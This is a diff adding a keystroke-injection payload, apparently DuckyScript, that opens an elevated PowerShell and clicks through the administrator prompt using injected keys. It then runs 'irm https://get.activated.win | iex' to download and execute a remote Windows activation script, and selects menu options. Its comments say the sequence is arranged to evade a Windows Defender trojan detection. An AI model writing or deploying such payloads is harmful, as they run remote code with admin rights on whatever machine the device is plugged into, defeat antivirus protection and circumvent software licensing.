@@ -1,0 +1,21 @@
+REM Description: Activate with massgrave script
+REM #### We must use longer method insted of
+REM #### STRING powershell -w h -NoP -NonI -Ep Bypass irm https://get.activated.win | iex
+REM #### because windows defender screams about "Trojan:win32/clickfix.ZC"
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 1500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 2000
+STRING irm https://get.activated.win | iex
+ENTER
+DELAY 6000
+STRING 3
+DELAY 1000
+STRING 5
+
